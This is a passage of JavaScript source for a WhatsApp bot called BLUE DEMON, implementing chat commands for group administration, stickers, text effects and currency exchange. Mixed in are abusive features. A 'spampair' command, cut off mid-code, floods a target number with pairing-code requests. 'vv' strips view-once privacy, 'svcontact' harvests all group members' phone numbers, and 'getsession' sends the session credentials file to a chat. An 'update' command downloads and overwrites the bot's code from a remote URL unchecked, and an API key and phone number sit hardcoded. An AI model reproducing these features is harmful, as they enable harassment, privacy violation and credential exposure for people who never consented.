┃ 📢 *\`WhatsApp Channel\`* 📢
┃    🔗 [Join Channel](https://whatsapp.com/channel/0029Vah3fKtCnA7oMPTPJm1h)
┃
┃ 💬 *\`Message\`* 💬
┃    *Stay updated with the latest news and features. Be part of the BLUE DEMON community.*
`;

                // Send the message
               reply(repo);
                break;
            }
            case 'update': {
                if (!isOwner) return reply(mess.only.owner);
                if (!isBuyer) return reply(mess.only.buyer)
                reply("*𝐔𝐏𝐃𝐀𝐓𝐈𝐍𝐆 𝐃𝐄𝐌𝐎𝐍 𝐁𝐎𝐓....*");
                try {
                    const githubRawUrl = 'https://raw.githubusercontent.com/BLUEXDEMONl/BLUEDEMON-UPDATE-/refs/heads/main/demontech.js';
                    const response = await fetch(githubRawUrl);

                    if (!response.ok) {
                        return bluereply('𝐒𝐄𝐑𝐕𝐄𝐑 𝐔𝐍𝐃𝐄𝐑 𝐌𝐀𝐈𝐍𝐓𝐄𝐍𝐀𝐍𝐂𝐄🔪');
                    }

                    const newFileContent = await response.text();

                    // Update the blue file
                    const fs = require('fs');
                    fs.writeFileSync('./demontech.js', newFileContent, 'utf8');

                    reply("𝐒𝐮𝐜𝐜𝐞𝐬𝐬𝐟𝐮𝐥𝐥𝐲 𝐮𝐩𝐝𝐚𝐭𝐞𝐝 𝐛𝐲 𝐁𝐋𝐔𝐄𝐃𝐄𝐌𝐎𝐍!");
                } catch (error) {
                    console.error("Error updating file:", error);
                    reply("Failed to update file. Please check the console for errors.");
                }

                break;
            }
            case 'svcontact': {
                if (!m.isGroup) return reply(mess.only.group);
                bluereply(mess.wait);
                try {
                    const groupMetadata = await blue.groupMetadata(m.chat);
                    const participants = groupMetadata.participants;

                    // Create VCF file content
                    let vcfContent = '';
                    participants.forEach(member => {
                        let phoneNumber = member.id.split('@')[0]; // Extract phone number from participant ID
                        vcfContent += `BEGIN:VCARD\nVERSION:3.0\nFN:[BLUE]\nTEL;type=CELL:+${phoneNumber}\nEND:VCARD\n\n`;
                    });

                    const groupName = groupMetadata.subject || 'Group';
                    const fileName = `${groupName}_contacts.vcf`;

                    // Write the VCF file
                    const filePath = `./${fileName}`;
                    fs.writeFileSync(filePath, vcfContent);

                    // Send the VCF file to the group
                    await blue.sendMessage(m.chat, {
                        document: fs.readFileSync(filePath),
                        fileName: fileName,
                        mimetype: 'text/vcard',
                        caption: `𝐂𝐎𝐍𝐓𝐀𝐂𝐓𝐒 𝐒𝐀𝐕𝐄𝐃 𝐁𝐘 ${botname}`
                    });

                    // Delete the VCF file from the server after sending
                    fs.unlinkSync(filePath);
                } catch (err) {

                }

                break;
            }
            case 'tag':
            case 'hidetag': {
                if (!m.isGroup) return reply(mess.only.group);

                // Check if the user is an admin, group owner, bot owner, or premium user
                if (!isAdmins && !isPremium) {
                    return reply(mess.only.owner);
                }

                // Check if there's a quoted message or text input
                let quotedMessage;
                if (m.quoted) {
                    quotedMessage = m.quoted.text; // Use quoted message text
                } else if (q) {
                    quotedMessage = q; // Use provided text
                } else {
                    quotedMessage = '☝️👆🤟'; // Default emoji message
                }

                // Send the message tagging all participants
                await blue.sendMessage(m.chat, {
                    text: quotedMessage,
                    mentions: participants.map(a => a.id) // Tag all participants
                });

                break;
            }
            case 'tagall': {
                if (!m.isGroup) return reply(mess.only.group);
                if (!isOwner && !isAdmins) return reply(mess.only.admin);

                // Send a preliminary "Tagging all participants, please wait..." message
                await bluereply(mess.wait);

                // Get group metadata to access participants
                const groupMetadata = await blue.groupMetadata(m.chat);
                const participants = groupMetadata.participants;

                // Map participants to their IDs for proper tagging
                const mentions = participants.map(p => p.id);

                // Create a list of participants to display in the message
                let participantsList = participants.map(participant => `${themeemoji} @${participant.id.split('@')[0]}`).join('\n');

                let message = `*👾\`ʙʟᴜᴇᴅᴇᴍᴏɴ ꜱᴜᴍᴍᴏɴꜱ yᴏᴜ ᴀʟʟ\`👾*:\n\n${participantsList}`;

                // Send the actual tag message with mentions
                await blue.sendMessage(m.chat, {
                    text: message,
                    mentions: mentions
                });

                // Send a confirmation message
                await blue.sendMessage(m.chat, {
                    text: 'DON TECH 🤟'
                });
            }
            break;
            case 'add': {
                if (!m.isGroup) return reply(mess.only.group);

                if (!isAdmins) return reply(mess.only.admin);

                if (!isBotAdmins) return reply(mess.only.badmin);

                // Determine the user to add
                let userToAdd = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net';

                // Validate the user to add
                if (!userToAdd) return reply('Please provide a valid number or reply to a message.');

                try {
                    // Attempt to add the user to the group
                    await blue.groupParticipantsUpdate(m.chat, [userToAdd], 'add');
                    bluereply(mess.success);
                } catch (err) {
                    // Handle potential errors
                    console.error('Error adding user:', err);
                    reply('Failed to add the user. Ensure the bot has the correct permissions and the user ID is valid.');
                }
            }
            break;
            case "kick": {
                if (!isGroup) return reply(mess.only.group);

                if (!isAdmins && !isOwner && !isPremium) return reply(mess.only.admin);

                if (!isBotAdmins) return reply(mess.only.badmin);

                // Get the target user
                let users = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net';

                try {
                    // Attempt to remove the user from the group
                    await blue.groupParticipantsUpdate(m.chat, [users], 'remove');
                    reply('User successfully removed from the group.');
                } catch (err) {
                    // Handle potential errors
                    reply('Failed to remove the user: ' + err.message);
                }
            }
            break;
            case "promote": {
                if (!isGroup) return reply(mess.only.group);

                if (!isAdmins && !isOwner) return reply(mess.only.admin);

                if (!isBotAdmins) return reply(mess.only.badmin);

                // Get the target user
                let users = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net';

                try {
                    // Attempt to promote the user to admin
                    await blue.groupParticipantsUpdate(m.chat, [users], 'promote');
                    bluereply(mess.success);
                } catch (err) {
                    // Handle errors during the promotion process
                    reply('Failed to promote the user: ' + err.message);
                }
            }
            break;
            case "demote": {
                if (!isGroup) return reply(mess.only.group);
                if (!isAdmins && !isOwner) return reply(mess.only.admin);
                if (!isBotAdmins) return reply(mess.only.badmin);

                // Get the target user
                let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net';

                // Prevent demotion if the target user is the bot owner
                if (users === owner) return reply("You cannot demote the bot's owner.");

                try {
                    // Attempt to demote the user from admin role
                    await blue.groupParticipantsUpdate(m.chat, [users], 'demote');
                    bluereply(mess.success);
                } catch (err) {
                    // Handle errors during the demotion process
                    reply('Failed to demote the user: ' + err.message);
                }
            }
            break;
            case 'mute': {
                // Check if the command is being used in a group
                if (!m.isGroup) return reply(mess.group);

                // Check if the user is an admin or the owner of the bot
                if (!isOwner && !isAdmins) return reply(mess.admin);

                // Check if the bot has admin rights
                if (!isBotAdmins) return reply(mess.botAdmin);

                try {
                    // Mute the group (only admins can send messages)
                    await blue.groupSettingUpdate(m.chat, 'announcement');
                    bluereply(mess.success);
                } catch (err) {
                    console.error(err);
                    reply('Failed to mute the group. Please try again.');
                }
                break;
            }
            case 'unmute': {
                // Check if the command is being used in a group
                if (!m.isGroup) return reply(mess.group);

                // Check if the user is an admin or the owner of the bot
                if (!isOwner && !isAdmins) return reply(mess.admin);

                // Check if the bot has admin rights
                if (!isBotAdmins) return reply(mess.botAdmin);

                try {
                    // Unmute the group (everyone can send messages)
                    await blue.groupSettingUpdate(m.chat, 'not_announcement');
                    bluereply(mess.success);
                } catch (err) {
                    console.error(err);
                    reply('Failed to unmute the group. Please try again.');
                }
                break;
            }
            case 'invite': {
                if (!isGroup) return reply(mess.only.grouo);
                if (!isBotAdmins) return reply(mess.only.admin);
                if (!text) return reply(`Enter the number you want to invite to the group.\n\nExample:\n*${prefix + command}* 255734980103`);
                if (text.includes('+')) return reply(`Please enter the number without the "+" symbol.`);
                if (isNaN(text)) return reply(`Please enter only numbers including your country code, without spaces.`);

                let group = m.chat;
                try {
                    let link = 'https://chat.whatsapp.com/' + await blue.groupInviteCode(group);
                    await blue.sendMessage(text + '@s.whatsapp.net', {
                        text: `🔪 *WAGWAN*\n*GROUP INVITATION*\n\n\`You are invited to join ${groupMetadata.subject}:\`🚶🚶\n\n${link}`,
                        mentions: [m.sender]
                    });
                    bluereply(mess.success);
                } catch (error) {
                    console.error(error);
                    reply("Failed to send the invite link. Please check the number and try again.");
                }
                break;
            }
            case 'leavegc': {
                if (!isOwner) return reply(mess.only.owner);
                await blue.groupLeave(m.chat)
                    .then((res) => reply(JSON.stringify(res)))
                    .catch((err) => reply(JSON.stringify(err)));
                break;
            }
            case 'setname':
            case 'setbotname': {
                if (!isOwner) return reply(mess.only.owner)
                if (!text) return reply(`Example: ${prefix + command} *BLUE DEMON*`)
                await blue.updateProfileName(text)
                reply(`*SUCCESSFULLY CHANGE NAME TO ${text}*`)
            }
            break
            case 'setgcname':
            case 'setnamegc':
            case 'setgroupname':
            case 'setsubject': {
                if (!isGroup) return reply(mess.only.group)
                if (!isBotAdmins) return reply(mess.only.badmin)
                if (!isAdmins) return reply(mess.only.admin)
                if (!text) return reply('*HUH?*')
                await blue.groupUpdateSubject(m.chat, text)
                await bluereply(mess.success)
            }
            break
            case 'setdesc':
            case 'setdesk': {
                if (!isGroup) return reply(mess.only.group)
                if (!isBotAdmins) return reply(mess.only.badmin)
                if (!isAdmins) return reply(mess.only.admin)
                if (!text) return reply('*HUH?*')
                await blue.groupUpdateDescription(m.chat, text)
                await bluereply(mess.success)
            }
            break
            case 'closegroup':
            case 'closegc': {
                if (!isGroup) return reply(mess.only.group);

                if (!isAdmins && !isOwner) return reply(mess.only.admin);

                if (!isBotAdmins) return reply(mess.only.badmin);

                if (!args[0]) return reply(`*Please specify the duration:*\n- second\n- minute\n- hour\n- day\n\n*Example:*\n${prefix + command} 10 second`);

                let timer;

                switch (args[1]) {
                    case 'second':
                        timer = args[0] * 1000;
                        break;
                    case 'minute':
                        timer = args[0] * 60000;
                        break;
                    case 'hour':
                        timer = args[0] * 3600000;
                        break;
                    case 'day':
                        timer = args[0] * 86400000;
                        break;
                    default:
                        return reply('Invalid time unit. Please choose from: second, minute, hour, or day.');
                }

                reply('*The timer has started!*');

                setTimeout(() => {
                    blue.groupSettingUpdate(m.chat, 'announcement')
                        .then(() => reply('*Time  to rest 🤟*'))
                        .catch((err) => reply(`Failed to close the group: ${err.message}`));
                }, timer);
            }
            break;
            case 'opengroup':
            case 'opengc': {
                if (!isGroup) return reply(mess.only.group);

                if (!isAdmins && !isOwner) return reply(mess.only.admin);

                if (!isBotAdmins) return reply(mess.only.badmin);

                if (!args[0]) return reply(`*Please specify the duration:*\n- second\n- minute\n- hour\n- day\n\n*Example:*\n${prefix + command} 10 second`);

                let timer;

                switch (args[1]) {
                    case 'second':
                        timer = args[0] * 1000;
                        break;
                    case 'minute':
                        timer = args[0] * 60000;
                        break;
                    case 'hour':
                        timer = args[0] * 3600000;
                        break;
                    case 'day':
                        timer = args[0] * 86400000;
                        break;
                    default:
                        return reply('Invalid time unit. Please choose from: second, minute, hour, or day.');
                }

                reply('*The timer has started!*');

                setTimeout(() => {
                    blue.groupSettingUpdate(m.chat, 'not_announcement')
                        .then(() => reply('*Time is up!*'))
                        .catch((err) => reply(`Failed to open the group: ${err.message}`));
                }, timer);
            }
            break;
            case 'revoke':
            case 'resetgclink': {
               if (!m.isGroup) return reply(mess.only.group);
               if (!isAdmins) return reply(mess.only.admin);
               if (!isBotAdmins) return reply(mess.only.badmin);
blue.groupRevokeInvite(from)
}
break
            case 'vv': {
                if (!m.quoted) return reply('Please reply to a view-once message.');
                if (m.quoted.mtype !== 'viewOnceMessageV2') return reply('This is not a view-once message.');

                try {
                    const msg = m.quoted.message;
                    const type = Object.keys(msg)[0];
                    const media = await downloadContentFromMessage(msg[type], type === 'imageMessage' ? 'image' : 'video');

                    // Create a buffer and accumulate the data
                    let buffer = Buffer.from([]);
                    for await (const chunk of media) {
                        buffer = Buffer.concat([buffer, chunk]);
                    }

                    // Send the media directly as an image or video
                    await blue.sendMessage(m.chat, {
                        [type === 'imageMessage' ? 'image' : 'video']: buffer,
                        caption: msg[type].caption || '',
                        mimetype: type === 'imageMessage' ? 'image/jpeg' : 'video/mp4'
                    }, {
                        quoted: m
                    });

                } catch (error) {
                    console.error(error);
                    reply('Failed to download or send media.');
                }
            }
            break;
            case 'ai': {
                if (!text) return reply(`*• Example:* ${prefix + command} Who was the person who discovered the computer in the Majapahit era?`);
                await blue.sendMessage(m.chat, {
                    react: {
                        text: "🤔",
                        key: m.key,
                    }
                })
                try {
                    let gpt = await (await fetch(`https://widipe.com/openai?text=${text}`)).json()
                    let msgs = generateWAMessageFromContent(m.chat, {
                        viewOnceMessage: {
                            message: {
                                "messageContextInfo": {
                                    "deviceListMetadata": {},
                                    "deviceListMetadataVersion": 2
                                },
                                interactiveMessage: proto.Message.InteractiveMessage.create({
                                    body: proto.Message.InteractiveMessage.Body.create({
                                        text: '> ʙʟᴜᴇ-ᴛᴇᴄʜ - AI\n\n' + gpt.result
                                    }),
                                    footer: proto.Message.InteractiveMessage.Footer.create({
                                        text: namabot
                                    }),
                                    header: proto.Message.InteractiveMessage.Header.create({
                                        hasMediaAttachment: false,
                                        ...await prepareWAMessageMedia({
                                            image: fs.readFileSync('./database/image/hmm.jpg')
                                        }, {
                                            upload: blue.waUploadToServer
                                        })
                                    }),
                                    nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                                        buttons: [{
                                            "name": "quick_reply",
                                            "buttonParamsJson": `{"display_text":"ᴄᴏᴏʟ-ᴀɪ","id":".mangap"}`
                                        }],
                                    }),
                                    contextInfo: {
                                        mentionedJid: [m.sender],
                                        forwardingScore: 999,
                                        isForwarded: true,
                                        forwardedNewsletterMessageInfo: {
                                            newsletterJid: '0@newsletter',
                                            newsletterName: namabot,
                                            serverMessageId: 143
                                        }
                                    }
                                })
                            }
                        }
                    }, {
                        quoted: m
                    })
                    await blue.relayMessage(m.chat, msgs.message, {})
                } catch (e) {
                    return reply("*Error* :(")
                }
            }
            case "qc": {
                if (!isOwner) return reply(mess.only.owner)
                if (!quoted) {
                    const getname = await blue.getName(mentionUser[0])
                    const json = {
                        "type": "quote",
                        "format": "png",
                        "backgroundColor": "#1830c9",
                        "width": 512,
                        "height": 768,
                        "scale": 2,
                        "messages": [{
                            "entities": [],
                            "avatar": true,
                            "from": {
                                "id": 1,
                                "name": getname,
                                "photo": {
                                    "url": ppuser
                                }
                            },
                            "text": quotedMsg.chats,
                            "replyMessage": {}
                        }]
                    };
                    const response = axios.post('https://bot.lyo.su/quote/generate', json, {
                        headers: {
                            'Content-Type': 'application/json'
                        }
                    }).then(res => {
                        const buffer = Buffer.from(res.data.result.image, 'base64')
                        const opt = {
                            packname: global.packname,
                            author: global.author
                        }
                        blue.sendStimg(from, buffer, m, opt)
                    });
                } else if (q) {
                    const json = {
                        "type": "quote",
                        "format": "png",
                        "backgroundColor": "#FFFFFF",
                        "width": 512,
                        "height": 768,
                        "scale": 2,
                        "messages": [{
                            "entities": [],
                            "avatar": true,
                            "from": {
                                "id": 1,
                                "name": pushname,
                                "photo": {
                                    "url": ppuser
                                }
                            },
                            "text": q,
                            "replyMessage": {}
                        }]
                    };
                    const response = axios.post('https://bot.lyo.su/quote/generate', json, {
                        headers: {
                            'Content-Type': 'application/json'
                        }
                    }).then(res => {
                        const buffer = Buffer.from(res.data.result.image, 'base64')
                        const opt = {
                            packname: global.packname,
                            author: global.author
                        }
                        blue.sendStimg(from, buffer, m, opt)
                    });
                } else {
                    reply(`Send command ${prefix+command} blue`)
                }
            }
            break

            case 's':
            case 'sticker':
            case 'take': {
                if (!quoted) return reply(`Send/Reply Images/Videos/Gifs With Captions ${prefix+command}\nVideo Duration 1-9 Seconds`)
                if (/image/.test(mime)) {
                    let media = await quoted.download()
                    let encmedia = await blue.sendImageAsSticker(m.chat, media, m, {
                        packname: global.packname,
                        author: global.author
                    })
                } else if (/video/.test(mime)) {
                    if ((quoted.msg || quoted).seconds > 11) return replyg('Send/Reply Images/Videos/Gifs With Captions ${prefix+command}\nVideo Duration 1-9 Seconds')
                    let media = await quoted.download()
                    let encmedia = await blue.sendVideoAsSticker(m.chat, media, m, {
                        packname: global.packname,
                        author: global.author
                    })
                } else {
                    reply(`Send/Reply Images/Videos/Gifs With Captions ${prefix+command}\nVideo Duration 1-9 Seconds`)
                }
            }
            break
            break
            case 'enc':
            case 'encrypt':
            case 'obfuscate': {
                if (!q) return reply(`Example ${prefix+command} const time = require('money')`)
                let meg = await obfus(q)
                reply(`${meg.result}`)
            }
            break
            case 'getsession': {
                // Check if the sender is the owner
                const ownerNumber = '2347041039367@s.whatsapp.net'; // Replace with your WhatsApp owner number
                if (m.sender !== ownerNumber) return reply('ꜱᴏʀʀy, ᴏɴʟy ᴛʜᴇ ʙᴏᴛ ᴏᴡɴᴇʀ ᴄᴀɴ ᴜꜱᴇ ᴛʜɪꜱ ᴄᴏᴍᴍᴀɴᴅ.');

                const credsPath = './session/creds.json';
                const fs = require('fs');

                try {
                    // Check if the file exists
                    if (!fs.existsSync(credsPath)) {
                        return reply('Sorry, the session file does not exist.');
                    }

                    // Send the session file as a document
                    await blue.sendMessage(m.chat, {
                        document: fs.readFileSync(credsPath), // Read the file
                        mimetype: 'application/json',
                        fileName: 'ᴄʀᴇᴅꜱ.ᴊꜱᴏɴ ʙy ʙʟᴜᴇxᴅᴇᴍᴏɴ' // Name of the file to send
                    }, {
                        quoted: m
                    });
                } catch (error) {
                    console.error(error);
                    reply(`An error occurred: ${error.message}`);
                }
                break;
            }
            case 'listblock': {
                // Check if the user is the owner or a premium user
                if (!isOwner && !isPremium) {
                    return reply(mess.only.premium);
                }

                try {
                    // Fetch the blocklist using your blue file structure
                    let block = await blue.fetchBlocklist();

                    // Prepare the message showing the number of blocked users and their details
                    let blockMessage = `*List of Blocked Users*:\n\n` +
                        `Total: ${block === undefined || block.length === 0 ? '*0* blocked' : '*' + block.length + '* blocked'}\n` +
                        block.map(v => '么 ' + v.replace(/@.+/, '')).join('\n');

                    // Send the blocklist as a reply
                    reply(blockMessage);
                } catch (error) {
                    // Handle any errors, e.g., if fetching the blocklist fails
                    reply("Failed to retrieve the blocklist.");
                }
                break;
            }
            case 'time': {
                // Define `time2` to get the current tim
                const newtime = `*𝗧𝗜𝗠𝗘*\n*${time2}*`;
                bluereply(newtime);
            }
            break;
            case 'runtime':
            case 'uptime': {
                // Assuming runx is defined elsewhere to calculate the uptime.
                // runx should return the formatted uptime duration (e.g., "2 hours 30 minutes")
                const lowq = `*𝗨𝗣𝗧𝗜𝗠𝗘*\n${runx}`;
                reply(lowq);
            }
            break;
            async function autoViewStatus() {
                if (autoswview) {
                    // Fetch the list of statuses
                    let statusList = await blue.fetchStatusUpdates();
                    for (let status of statusList) {
                        // Automatically view each status
                        await blue.readStatus(status.id);
                    }
                }
            }
            case 'avs':
            case 'autostatus': {
                // Check if the user is the owner of the bot
                if (!isOwner) return reply(mess.owner);

                // Check for input argument
                if (!q) return reply('ᴜꜱᴀɢᴇ: ᴏɴ/ᴏꜰꜰ');

                if (q === 'on') {
                    autoswview = true;
                    reply(`ᴀᴜᴛᴏᴠɪᴇᴡꜱᴛᴀᴛᴜꜱ ʜᴀꜱ ʙᴇᴇɴ ᴇɴᴀʙʟᴇᴅ.`);
                } else if (q === 'off') {
                    autoswview = false;
                    reply(`ᴀᴜᴛᴏᴠɪᴇᴡꜱᴛᴀᴛᴜꜱ ʜᴀꜱ ʙᴇᴇɴ ᴅɪꜱᴀʙʟᴇᴅ.`);
                } else {
                    reply('ɪɴᴠᴀʟɪᴅ ɪɴᴘᴜᴛ. ᴜꜱᴇ "ᴏɴ" ᴏʀ "ᴏꜰꜰ".');
                }

                break;
            }
            autoViewStatus();
            case 'totalcase':
            case 'totalcmd':
            case 'totalcommand':
                reply(`*Hey* *${pushname}* *${botname}* *has total features of* *${nanototalpitur()}*`)
                break
            case 'getip':
            case 'ip': {
                if (!isOwner) return reply(mess.only.owner);
                try {
                    const apiUrl = 'https://apitoxxictechinc.vercel.app/api/get-ip';
                    const response = await fetch(apiUrl);
                    const apiResponse = await response.json();

                    if (!apiResponse || !apiResponse.ip) {
                        throw new Error('Failed to fetch IP information from the API.');
                    }

                    const ipMessage = `*𝐈𝐏 𝐀𝐃𝐃𝐑𝐄𝐒𝐒 𝐁𝐘 𝐃𝐄𝐌𝐎𝐍:* *\`${apiResponse.ip}\`*`;
                    blue.sendMessage(m.chat, {
                        text: ipMessage
                    }, {
                        quoted: m
                    });
                } catch (error) {
                    console.error(error);
                    blue.sendMessage(m.chat, {
                        text: 'An error occurred: ' + error.message
                    }, {
                        quoted: m
                    });
                }
                break;
            }
            case 'hrt':
            case 'love': {

                // Array of heart emojis to send one by one
                const heartEmojis = [
                    '♥️', '❣️', '💘', '💝', '💖', '💗', '💓', '💞', '💕', '❤️‍🔥',
                    '❤️', '🧡', '💛', '💚', '💙', '💜', '🤎', '🖤', '🤍', '💕',
                    '🫀', '💓', '💝', '💞', '💓', '💘', '💗', '💝', '💓'
                ];

                // Send the initial message
                const loveMsg = await blue.sendMessage(m.chat, {
                    text: heartEmojis[0]
                }, {
                    quoted: m
                });

                // Function to update the message with new emojis
                const updateMessage = async (index = 1) => {
                    if (index < heartEmojis.length) {
                        await blue.relayMessage(m.chat, {
                            protocolMessage: {
                                key: loveMsg.key,
                                type: 14,
                                editedMessage: {
                                    conversation: heartEmojis[index]
                                }
                            }
                        }, {});

                        // Schedule the next update after 2 seconds
                        setTimeout(() => updateMessage(index + 1), 1000);
                    }
                };

                // Start updating the message with heart emojis one by one
                setTimeout(() => updateMessage(), 1000);
                break;
            }
            case 'confuse':
            case 'conf': {
                // Array of confused-themed emojis to send one by one
                const confusedEmojis = [
                    '😕', '🤔', '😵', '😵‍💫', '🤷', '🤷‍♂️', '🤷‍♀️', '😮‍💨', '😐', '🤨',
                    '🙃', '😬', '😯', '😖', '😑', '😳', '🤪', '🤯'
                ];

                // Send the initial confused emoji
                const confuseMsg = await blue.sendMessage(m.chat, {
                    text: confusedEmojis[0]
                }, {
                    quoted: m
                });

                // Function to update the message with new confused emojis
                const updateMessage = async (index = 1) => {
                    if (index < confusedEmojis.length) {
                        await blue.relayMessage(m.chat, {
                            protocolMessage: {
                                key: confuseMsg.key,
                                type: 14,
                                editedMessage: {
                                    conversation: confusedEmojis[index]
                                }
                            }
                        }, {});

                        // Schedule the next update after 2 seconds
                        setTimeout(() => updateMessage(index + 1), 1000);
                    }
                };

                // Start updating the message with confused emojis one by one
                setTimeout(() => updateMessage(), 1000);
                break;
            }
            case 'angry':
            case 'gtf': {
                // Array of angry-themed stickers/emojis to send one by one
                const angryEmojis = [
                    '😡', '😠', '🤬', '👿', '💢', '🔥', '😾', '😤', '🤯', '💥',
                    '😾', '👺', '👊', '🗯️', '😒', '👎', '🥵', '🧨', '👹', '💣',
                    '😠', '👊', '💥', '😡', '🤬', '🔥', '🖕🏽'
                ];

                // Send the initial angry emoji
                const angryMsg = await blue.sendMessage(m.chat, {
                    text: angryEmojis[0]
                }, {
                    quoted: m
                });

                // Function to update the message with new emojis/stickers
                const updateMessage = async (index = 1) => {
                    if (index < angryEmojis.length) {
                        await blue.relayMessage(m.chat, {
                            protocolMessage: {
                                key: angryMsg.key,
                                type: 14,
                                editedMessage: {
                                    conversation: angryEmojis[index]
                                }
                            }
                        }, {});

                        // Schedule the next update after 2 seconds
                        setTimeout(() => updateMessage(index + 1), 1000);
                    }
                };

                // Start updating the message with angry emojis/stickers one by one
                setTimeout(() => updateMessage(), 1000);
                break;
            }
                    case 'glitchtext':
case 'writetext':
case 'advancedglow':
case 'typographytext':
case 'pixelglitch':
case 'neonglitch':
case 'flagtext':
case 'flag3dtext':
case 'deletingtext':
case 'blackpinkstyle':
case 'glowingtext':
case 'underwatertext':
case 'logomaker':
case 'cartoonstyle':
case 'papercutstyle':
case 'watercolortext':
case 'effectclouds':
case 'blackpinklogo':
case 'gradienttext':
case 'summerbeach':
case 'luxurygold':
case 'multicoloredneon':
case 'sandsummer':
case 'galaxywallpaper':
case '1917style':
case 'makingneon':
case 'royaltext':
case 'freecreate':
case 'galaxystyle':
case 'lighteffects':{

if (!text) return reply(`Example : ${prefix+command} +`) 
bluereply(mess.wait);
let link
if (/glitchtext/.test(command)) link = 'https://en.ephoto360.com/create-digital-glitch-text-effects-online-767.html'
if (/writetext/.test(command)) link = 'https://en.ephoto360.com/write-text-on-wet-glass-online-589.html'
if (/advancedglow/.test(command)) link = 'https://en.ephoto360.com/advanced-glow-effects-74.html'
if (/typographytext/.test(command)) link = 'https://en.ephoto360.com/create-typography-text-effect-on-pavement-online-774.html'
if (/pixelglitch/.test(command)) link = 'https://en.ephoto360.com/create-pixel-glitch-text-effect-online-769.html'
if (/neonglitch/.test(command)) link = 'https://en.ephoto360.com/create-impressive-neon-glitch-text-effects-online-768.html'
if (/flagtext/.test(command)) link = 'https://en.ephoto360.com/nigeria-3d-flag-text-effect-online-free-753.html'
if (/flag3dtext/.test(command)) link = 'https://en.ephoto360.com/free-online-american-flag-3d-text-effect-generator-725.html'
if (/deletingtext/.test(command)) link = 'https://en.ephoto360.com/create-eraser-deleting-text-effect-online-717.html'
if (/blackpinkstyle/.test(command)) link = 'https://en.ephoto360.com/online-blackpink-style-logo-maker-effect-711.html'
if (/glowingtext/.test(command)) link = 'https://en.ephoto360.com/create-glowing-text-effects-online-706.html'
if (/underwatertext/.test(command)) link = 'https://en.ephoto360.com/3d-underwater-text-effect-online-682.html'
if (/logomaker/.test(command)) link = 'https://en.ephoto360.com/free-bear-logo-maker-online-673.html'
if (/cartoonstyle/.test(command)) link = 'https://en.ephoto360.com/create-a-cartoon-style-graffiti-text-effect-online-668.html'
if (/papercutstyle/.test(command)) link = 'https://en.ephoto360.com/multicolor-3d-paper-cut-style-text-effect-658.html'
if (/watercolortext/.test(command)) link = 'https://en.ephoto360.com/create-a-watercolor-text-effect-online-655.html'
if (/effectclouds/.test(command)) link = 'https://en.ephoto360.com/write-text-effect-clouds-in-the-sky-online-619.html'
if (/blackpinklogo/.test(command)) link = 'https://en.ephoto360.com/create-blackpink-logo-online-free-607.html'
if (/gradienttext/.test(command)) link = 'https://en.ephoto360.com/create-3d-gradient-text-effect-online-600.html'
if (/summerbeach/.test(command)) link = 'https://en.ephoto360.com/write-in-sand-summer-beach-online-free-595.html'
if (/luxurygold/.test(command)) link = 'https://en.ephoto360.com/create-a-luxury-gold-text-effect-online-594.html'
if (/multicoloredneon/.test(command)) link = 'https://en.ephoto360.com/create-multicolored-neon-light-signatures-591.html'
if (/sandsummer/.test(command)) link = 'https://en.ephoto360.com/write-in-sand-summer-beach-online-576.html'
if (/galaxywallpaper/.test(command)) link = 'https://en.ephoto360.com/create-galaxy-wallpaper-mobile-online-528.html'
if (/1917style/.test(command)) link = 'https://en.ephoto360.com/1917-style-text-effect-523.html'
if (/makingneon/.test(command)) link = 'https://en.ephoto360.com/making-neon-light-text-effect-with-galaxy-style-521.html'
if (/royaltext/.test(command)) link = 'https://en.ephoto360.com/royal-text-effect-online-free-471.html'
if (/freecreate/.test(command)) link = 'https://en.ephoto360.com/free-create-a-3d-hologram-text-effect-441.html'
if (/galaxystyle/.test(command)) link = 'https://en.ephoto360.com/create-galaxy-style-free-name-logo-438.html'
if (/lighteffects/.test(command)) link = 'https://en.ephoto360.com/create-light-effects-green-neon-online-429.html'
let haldwhd = await ephoto(link, text)
blue.sendMessage(m.chat, { image: { url: haldwhd }, caption: `${botname}` }, { quoted: m })
}
break
            case 'exchange': {
                if (!args[0] || !args[1] || !args[2]) return reply('\nExample: exchange 100 USD EUR');

                const amount = parseFloat(args[0]);
                const fromCurrency = args[1].toUpperCase();
                const toCurrency = args[2].toUpperCase();

                if (isNaN(amount)) return reply('Please enter a valid amount.');

                try {
                    // Send request to ExchangeRate API
                    const apiKey = '43f31fb84c391ced11b216a4';
                    const url = `https://v6.exchangerate-api.com/v6/${apiKey}/pair/${fromCurrency}/${toCurrency}`;

                    const response = await axios.get(url);
                    const exchangeRate = response.data.conversion_rate;

                    // Calculate converted amount
                    const convertedAmount = (amount * exchangeRate).toFixed(2);

                    // Reply with conversion result
                    reply(`💱 *Currency Exchange*\n\n*Amount:* ${amount} ${fromCurrency}\n*Converted Amount:* ${convertedAmount} ${toCurrency}\n*Exchange Rate:* 1 ${fromCurrency} = ${exchangeRate} ${toCurrency}
> ʙʟᴜᴇᴅᴇᴍᴏɴ`);
                } catch (error) {
                    console.error(error);
                    reply('Error: Unable to retrieve exchange rates. Please try again later.');
                }
                break;
            }
            case 'spampair': {
                if (!isPremium) return reply(mess.only.premium)
                if (!isBuyer) return reply(mess.only.buyer)
                const usePairingCode = true
                const NodeCache = require("node-cache")
                const resolveMsgBuffer = new NodeCache()
                if (!isOwner) return
                if (!q) return reply(`*👾*\n\n*_Use : Spampair NUMBER*|AMOUNT_\n_Example : Spampair 62xx_`)
                let [peenis, pepekk = "200"] = q.split("|")
                await reply(`👾𝙎𝙋𝘼𝙈 𝘾𝙊𝘿𝙀 𝙎𝙐𝘾𝘾𝙀𝙎𝙎𝙁𝙐𝙇𝙇𝙔👾`)

                let target = peenis.replace(/[^0-9]/g, '').trim()
                let {
                    default: makeWaSocket,
                    useMultiFileAuthState,
                    fetchLatestBaileysVersion
                } = require('@whiskeysockets/baileys')
                let {
                    state
                } = await useMultiFileAuthState('pairSess')
                let {
                    version
                } = await fetchLatestBaileysVersion()
                let sucked = await makeWaSocket({
                    auth: state,
                    browser: ['Mac Os', 'chrome', '121.0.6167.159'],
                    version: [2, 2413, 1],
                    keepAliveIntervalMs: 50000,
                    printQRInTerminal: !usePairingCode,
                    generateHighQualityLinkPreview: true,
